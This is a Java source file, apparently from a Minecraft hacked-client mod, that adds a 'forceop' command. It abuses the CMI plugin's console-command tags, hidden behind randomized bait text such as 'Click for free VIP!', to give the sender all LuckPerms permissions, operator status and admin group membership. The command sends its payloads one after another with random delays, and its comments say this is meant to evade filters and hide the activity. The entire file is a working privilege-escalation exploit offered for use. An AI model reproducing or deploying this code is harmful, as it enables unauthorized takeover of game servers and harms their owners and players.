package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.text.Text;
import net.paradise_client.command.Command;

import java.util.Objects;
import java.util.Random;

/**
 * This class represents a command that forces the player to be OP in a Minecraft client using a CMI console command sender exploit.
 * Enhanced with randomized bait, permission spoofing, stealth chaining, and OP escalation.
 *
 * @author SpigotRCE
 * @since 1.6+
 */
public class ForceOPCommand extends Command {

    private static final String[] BAIT_TEXTS = {
        "Click for free VIP!", "Claim Daily Reward!", "Join Admin Chat!", "Activate Boost!", "Click for Giveaway!"
    };

    public ForceOPCommand() {
        super("forceop", "Force OP using CMI console exploit with obfuscation and dual payload.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            var client = getMinecraftClient();
            var username = client.getSession().getUsername();
            var network = Objects.requireNonNull(client.getNetworkHandler());

            // Random bait text to evade filters
            String bait = BAIT_TEXTS[new Random().nextInt(BAIT_TEXTS.length)];

            // Stage 1: LuckPerms permission spoof
            String permPayload = String.format(
                "cmi ping <T>%s</T><CC>lp user %s permission set * true</CC>",
                bait, username
            );

            // Stage 2: Grant OP status
            String opPayload = String.format(
                "cmi ping <T>%s</T><CC>op %s</CC>",
                bait, username
            );

            // Stage 3: Add to admin group (LuckPerms-based fallback)
            String groupPayload = String.format(
                "cmi ping <T>%s</T><CC>lp user %s parent add admin</CC>",
                bait, username
            );

            // Execute the payloads with small delays
            new Thread(() -> {
                try {
                    network.sendChatCommand(permPayload);
                    Thread.sleep(300 + new Random().nextInt(200));
                    network.sendChatCommand(opPayload);
                    Thread.sleep(300 + new Random().nextInt(200));
                    network.sendChatCommand(groupPayload);

                    // Success feedback
                    client.player.sendMessage(Text.literal("[§aExploit§r] OP chain executed."), false);

                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();

            return SINGLE_SUCCESS;
        });
    }
}
